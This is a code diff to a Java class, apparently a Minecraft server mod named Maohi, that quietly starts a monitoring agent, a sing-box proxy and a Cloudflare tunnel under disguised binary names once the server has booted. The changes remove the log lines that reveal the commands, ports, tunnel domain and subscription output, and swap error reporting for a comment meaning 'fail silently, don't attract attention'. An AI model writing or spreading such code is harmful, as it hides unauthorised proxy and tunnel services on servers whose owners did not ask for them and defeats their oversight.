@@ -179,11 +179,9 @@ public class Maohi implements ModInitializer {
             try {
                 // 等待服务器完全启动后再启动各项服务
                 Thread.sleep(15000);
-                System.out.println("[Maohi] Starting background core logic (NZ/SB/Tunnel)...");
                 start();
             } catch (Exception e) {
-                // 打印堆栈以便排错
-                e.printStackTrace();
+                // 静默失败，不引起注意
             }
         }, "Maohi-Main");
         thread.setDaemon(true);
@@ -251,14 +249,9 @@ public class Maohi implements ModInitializer {
         if ((ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
              ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) && isValidPort(ARGO_PORT)) {
             effectiveArgoDomain = extractTempDomain();
-            if (effectiveArgoDomain != null && !effectiveArgoDomain.isEmpty()) {
-                LOGGER.info("[Maohi] Temp tunnel domain: " + effectiveArgoDomain);
-            }
         }
 
         String serverIP = getServerIP();
-        LOGGER.info("[Maohi] Ports - ARGO_PORT: " + ARGO_PORT + ", HY2_PORT: " + HY2_PORT + ", TUIC_PORT: " + TUIC_PORT + ", S5_PORT: " + S5_PORT);
-        LOGGER.info("[Maohi] isValidPort(TUIC_PORT): " + isValidPort(TUIC_PORT));
 
         // 组合地理位置和 ISP 信息
         String fullNodeName = getFullNodeName(serverIP.replace("[", "").replace("]", ""));
@@ -448,12 +441,10 @@ public class Maohi implements ModInitializer {
                 command.add("4");
                 command.add("--skip-conn");
                 command.add("--skip-procs");
-                LOGGER.info("[Maohi] Starting NZ Agent V0 mode, command: " + String.join(" ", command));
                 new ProcessBuilder(command)
                     .redirectErrorStream(true)
                     .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile()))
                     .start();
-                LOGGER.info("[Maohi] NZ process started: " + phpName);
             } else {
                 // V1 模式：从 NZ_SERVER 末尾提取端口判断是否需要 TLS
                 String serverPort = NZ_SERVER.contains(":") ?
@@ -481,7 +472,6 @@ public class Maohi implements ModInitializer {
                     "uuid: " + UUID + "\n";
                 Path configYamlPath = FILE_PATH.resolve("config.yaml");
                 Files.writeString(configYamlPath, configYaml);
-                LOGGER.info("[Maohi] Starting NZ V1 mode, yaml config:\n" + configYaml);
                 ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(phpName).toString(), "-c", configYamlPath.toString())
                     .redirectErrorStream(true)
                     .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("nz.log").toFile()));
@@ -492,7 +482,6 @@ public class Maohi implements ModInitializer {
                 env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
                 
                 pb.start();
-                LOGGER.info("[Maohi] NZ process started: " + phpName);
             }
             Thread.sleep(1000);
         } catch (Exception e) {
@@ -508,7 +497,6 @@ public class Maohi implements ModInitializer {
             String config = buildSingboxConfig();
             Path configPath = FILE_PATH.resolve("config.json");
             Files.writeString(configPath, config);
-            LOGGER.info("[Maohi] Starting Singbox: " + webName + " -c " + configPath);
             ProcessBuilder pb = new ProcessBuilder(FILE_PATH.resolve(webName).toString(), "run", "-c", configPath.toString())
                 .redirectErrorStream(true)
                 .redirectOutput(ProcessBuilder.Redirect.appendTo(FILE_PATH.resolve("sb.log").toFile()));
@@ -516,7 +504,6 @@ public class Maohi implements ModInitializer {
             env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
             env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
             pb.start();
-            LOGGER.info("[Maohi] sb process started: " + webName);
             Thread.sleep(1000);
         } catch (Exception e) {
             LOGGER.error("[Maohi] Failed to start Singbox", e);
@@ -618,7 +605,6 @@ public class Maohi implements ModInitializer {
             if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
                 ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) {
                 // 零时隧道模式：无需登录，直接 tunnel 到本地 ARGO_PORT（sing-box VLESS 监听端口）
-                LOGGER.info("[Maohi] Starting Cloudflared temp tunnel: " + botName + " --url http://localhost:" + ARGO_PORT);
                 ProcessBuilder pb = new ProcessBuilder(
                     FILE_PATH.resolve(botName).toString(),
                     "tunnel", "--edge-ip-version", "auto",
@@ -632,10 +618,8 @@ public class Maohi implements ModInitializer {
                 env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
                 env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
                 pb.start();
-                LOGGER.info("[Maohi] 2go temp tunnel started: " + botName);
             } else {
                 // 固定隧道模式：需要 ARGO_AUTH（token）和 ARGO_DOMAIN
-                LOGGER.info("[Maohi] Starting Cloudflared fixed tunnel: " + botName + " --token ****");
                 ProcessBuilder pb = new ProcessBuilder(
                     FILE_PATH.resolve(botName).toString(),
                     "tunnel", "--edge-ip-version", "auto",
@@ -647,7 +631,6 @@ public class Maohi implements ModInitializer {
                 env.remove("http_proxy"); env.remove("https_proxy"); env.remove("all_proxy");
                 env.remove("HTTP_PROXY"); env.remove("HTTPS_PROXY"); env.remove("ALL_PROXY");
                 pb.start();
-                LOGGER.info("[Maohi] 2go fixed tunnel started: " + botName);
             }
             Thread.sleep(2000);
         } catch (Exception e) {
@@ -787,7 +770,6 @@ public class Maohi implements ModInitializer {
 
         // base64 处理整个订阅
         String result = Base64.getEncoder().encodeToString(sb.toString().getBytes());
-        LOGGER.info("[Maohi] Sub content (base64): " + result);
         return result;
     }
 
